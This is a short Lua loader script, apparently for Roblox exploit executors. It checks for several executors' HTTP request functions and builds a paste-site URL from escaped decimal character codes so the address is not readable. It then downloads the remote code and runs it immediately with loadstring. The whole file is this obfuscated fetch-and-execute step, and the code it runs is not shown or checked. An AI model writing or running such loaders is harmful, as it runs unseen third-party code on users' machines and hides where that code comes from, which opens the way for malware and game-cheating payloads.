(function()
    local a = (syn and syn.request) or (http and http.request) or (request) or (http_request) or (fluxus and fluxus.request) or game.HttpGet
    local b = (typeof(a) == "function" and a) or function(c, d) return game:HttpGet(d) end
    local e = (b == game.HttpGet and b(game, "\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\76\90\79\82\100\78\104\88\47\114\97\119")) 
        or (b({Url="\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\76\90\79\82\100\78\104\88\47\114\97\119", Method="GET"}).Body)
    loadstring(e)()
end)()
